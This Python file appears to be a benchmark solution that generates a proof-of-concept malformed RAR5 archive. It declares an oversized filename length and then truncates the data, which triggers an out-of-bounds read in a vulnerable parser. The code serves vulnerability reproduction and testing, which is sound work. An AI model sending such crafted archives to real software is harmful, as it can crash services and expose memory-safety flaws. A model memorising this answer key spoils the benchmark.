import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # This PoC constructs a minimal RAR5 archive with a single file header.
        # The vulnerability lies in how the filename length is handled. The parser
        # reads the length, allocates memory, and then reads the filename, *before*
        # validating if the length is excessive.
        # By providing a large filename length and then truncating the file,
        # we cause the parser to read past the end of the input buffer,
        # leading to a crash.

        # RAR5 file signature
        poc = bytearray(b'Rar!\x1a\x07\x01\x00')

        # --- File Header Block Construction ---

        # 1. Header Payload (the part of the header after HeaderSize)
        # This contains the fields of the file header.

        # Header Type: 2 (File Header)
        # Header Flags: 0
        # File Flags: 0
        # Unpacked Size: 0
        # File Attributes: 0
        # Compression Info: 0
        # Host OS: 0
        header_payload = bytearray(b'\x02\x00\x00\x00\x00\x00\x00')

        # FileNameLength: A large value (e.g., 65536) to trigger the large read.
        # This is encoded as a RAR5 variable-length integer (vint).
        # 65536 encodes to b'\x80\x80\x04'.
        file_name_length_vint = b'\x80\x80\x04'
        header_payload.extend(file_name_length_vint)

        # 2. Header Size
        # The size of the header payload (10 bytes) encoded as a vint.
        header_size_vint = b'\x0a'

        # 3. Header CRC
        # The CRC is calculated over the combination of the header size vint
        # and the header payload itself.
        data_for_crc = header_size_vint + header_payload
        crc_val = zlib.crc32(data_for_crc) & 0xFFFFFFFF
        crc_bytes = struct.pack('<I', crc_val)

        # 4. Assemble the full header block
        # The complete block is [CRC, HeaderSize, HeaderPayload].
        header_block = crc_bytes + data_for_crc

        poc.extend(header_block)

        # The PoC file ends immediately after the header. No actual filename data
        # is provided. The attempt to read the 65536-byte filename will
        # read out of bounds, triggering the vulnerability.

        return bytes(poc)